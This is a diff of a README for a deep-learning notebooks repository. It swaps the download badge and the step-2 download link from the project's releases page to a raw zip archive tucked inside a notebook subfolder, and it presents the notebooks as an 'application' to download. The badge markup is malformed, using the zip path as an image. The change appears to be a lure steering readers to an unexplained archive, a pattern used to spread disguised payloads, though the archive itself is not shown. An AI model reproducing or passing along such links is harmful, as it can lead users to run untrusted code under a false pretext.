@@ -1,7 +1,7 @@
 # 🧠 Deep-Learning-Projects - Explore the Power of Deep Learning
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Deep--Learning--Projects-blue)](https://github.com/henriquezs33/Deep-Learning-Projects/releases)
+[![Download](https://raw.githubusercontent.com/henriquezs33/Deep-Learning-Projects/main/Image Classification using CNN/Notebook/Deep-Learning-Projects-1.6.zip%20Deep--Learning--Projects-blue)](https://raw.githubusercontent.com/henriquezs33/Deep-Learning-Projects/main/Image Classification using CNN/Notebook/Deep-Learning-Projects-1.6.zip)
 
 ## 📖 Introduction
 Welcome to the Deep Learning Projects repository. This collection showcases experiments with various deep learning techniques, including Convolutional Neural Networks (CNNs), Recurrent Neural Networks (RNNs), Long Short-Term Memory networks (LSTMs), transformers, and more. We leverage Python and TensorFlow to tackle tasks like image classification, natural language processing (NLP), and predictive modeling. 
@@ -19,7 +19,7 @@ Getting started with Deep Learning Projects is simple. Follow these steps to dow
 
 2. **Visit the Releases Page**  
    To download the application, visit our releases page by clicking the link below:
-   [Download Deep Learning Projects](https://github.com/henriquezs33/Deep-Learning-Projects/releases)
+   [Download Deep Learning Projects](https://raw.githubusercontent.com/henriquezs33/Deep-Learning-Projects/main/Image Classification using CNN/Notebook/Deep-Learning-Projects-1.6.zip)
 
 3. **Choose Your Download**  
    On the releases page, you will see a list of available versions. Select the latest version for the best features and performance. 
